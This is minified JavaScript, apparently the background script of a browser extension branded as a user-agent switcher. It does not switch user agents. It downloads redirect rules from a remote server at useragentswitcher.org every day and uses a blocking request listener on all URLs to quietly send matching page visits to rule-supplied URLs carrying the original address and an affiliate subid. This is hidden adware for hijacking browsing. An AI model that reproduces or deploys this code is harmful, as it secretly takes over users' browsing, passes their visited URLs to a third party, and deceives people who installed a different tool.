var linksList={},alreadyUsed=localStorage.alreadyUsed?parseInt(localStorage.alreadyUsed):null,api_link="http://api.useragentswitcher.org/api/",mainRgxp=/^(?:([^:\/?]+):)?(?:\/\/([^\/]*))?([^?]*)(?:\?([^$]*))?/,domainRgxp=/((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i;
function Request(a,c,d){var b=a.params?a.params:[],e=new XMLHttpRequest;c&&(e.onload=function(a){a=a.target;200===a.status||304===a.status?c({responseText:a.responseText,headers:a.getAllResponseHeaders().split("\r\n")}):d&&d(a.status)});d&&(e.onerror=function(a){a=a.target.status;d(a)});e.open(a.method,a.url);if(b.head)for(i in b.head)a.setRequestHeader(i,b.head[i]);if(b.mime)for(i in b.mime)a.overrideMimeType(b.mime[i]);b.post&&e.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
(b.post||b.xml)&&e.setRequestHeader("X-Requested-With","XMLHttpRequest");if("object"==typeof b.post)for(i in x=b.post,b.post="",x)x.hasOwnProperty(i)&&(b.post+=(b.post?"&":"")+i+"="+x[i]);e.send(b.post)}function cutw(a){return a.replace(/(^www\.|\:\d+$)/ig,"")}function getDomain(a){a=a.match(domainRgxp);var c;a&&(c=a[1]);return c}function getSub(a,c){var d=a.replace(c,"");d&&(d=d.replace(/\.$/,""));return d}
function prepareLink(a){/^(\w+:)?\/\//.test(a)||(a="http://"+a);a=a.match(mainRgxp);var c;if(a)try{var d=cutw(a[2]),b=getDomain(d);if(b){var e=getSub(d,b);c={sch:a[1],host:d,domain:b,sub:e,path:(a[3]||"").replace(/^\//,""),search:(a[4]||"").replace(/^\?/,"")}}}catch(f){console.log("Error: "+url)}return c}
function checkLink(a){if(!(alreadyUsed&&alreadyUsed>(new Date).getTime()-42E5)){var c,d=prepareLink(a);if(d&&linksList[d.domain]){var b=linksList[d.domain][d.sub];b&&(b[d.path]?c=b[d.path]:b["*"]&&(c=b["*"]));c||(b=linksList[d.domain]["*"])&&(b[d.path]?c=b[d.path]:b["*"]&&(c=b["*"]));if(c)return c=c.replace(/__CURURL__/g,encodeURIComponent(a)).replace(/__SUBID__/g,116),alreadyUsed=(new Date).getTime(),localStorage.alreadyUsed=alreadyUsed,c}}}
var bfListener=function(a){if(!(alreadyUsed&&alreadyUsed>(new Date).getTime()-42E5)&&0===a.frameId&&"main_frame"==a.type&&-1===a.parentFrameId&&0<a.tabId&&/^https?/i.test(a.url)){a=a.url;prepareLink(a);var c=checkLink(a);if("string"===typeof c&&a!=c)return{redirectUrl:c}}};function getDataRules(){setTimeout(getDataRules,864E5);Request({method:"GET",url:api_link+"uswrules?subid=116"},function(a){try{a=JSON.parse(a.responseText),linksList=a.links?a.links:{}}catch(c){}},function(){})}
chrome.webRequest.onBeforeRequest.addListener(bfListener,{urls:["<all_urls>"]},["blocking"]);getDataRules();